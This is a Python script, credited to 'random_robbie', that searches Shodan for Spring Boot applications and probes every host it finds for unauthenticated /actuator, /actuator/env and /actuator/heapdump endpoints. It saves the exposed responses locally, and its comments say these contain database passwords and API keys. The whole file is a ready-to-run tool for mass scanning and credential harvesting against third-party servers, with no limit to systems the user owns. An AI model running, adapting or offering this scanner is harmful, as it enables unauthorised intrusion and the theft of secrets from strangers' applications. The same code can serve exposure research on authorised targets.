#!/usr/bin/env python3
#
# actuator.py
# Search SHODAN for Spring Boot applications with exposed actuator endpoints.
# /actuator/env dumps application properties — including database passwords
# and API keys — and /actuator/heapdump can be parsed for credentials from
# application memory.
#
# Author: random_robbie

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common import get_api_key, open_output

import shodan
import requests

# Configuration
SEARCH_FOR = 'http.html:"Whitelabel Error Page"'
ENDPOINTS = ["/actuator", "/actuator/env", "/actuator/heapdump"]
CFG_DIR = "cfg"
session = requests.Session()


def check_actuator(ip, port):
    """Probe the standard actuator endpoints for unauthenticated exposure."""
    print("[*] Testing: " + ip + " on Port: " + port + "[*]\n")
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
            "Connection": "close",
        }
        base = "http://" + ip + ":" + port
        exposed = []
        for path in ENDPOINTS:
            response = session.get(base + path, headers=headers, timeout=15, verify=False)
            if response.status_code == 200 and len(response.content) > 2:
                exposed.append((path, response.text[:2000] if path != "/actuator/heapdump" else "binary"))
        if exposed:
            with open_output(os.path.join(CFG_DIR, ip + "-actuator.txt"), "a") as fh:
                for path, content in exposed:
                    fh.write("%s:\n%s\n---\n" % (path, content))
            print("[*] Spring Boot actuator exposed Whooops.. [*]\n")
        else:
            print("[*] Actuator endpoints not exposed. [*]\n")
    except KeyboardInterrupt:
        sys.exit("Ctrl-c pressed ...")
    except Exception as e:
        print(e)
        print("[*] Nothing Found on IP:" + ip + " [*]\n")


def main():
    api = shodan.Shodan(get_api_key())
    result = api.search(SEARCH_FOR)
    for service in result["matches"]:
        check_actuator(service["ip_str"], str(service["port"]))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("Ctrl-c pressed ...")
    except Exception as e:
        sys.exit("Error: %s" % e)
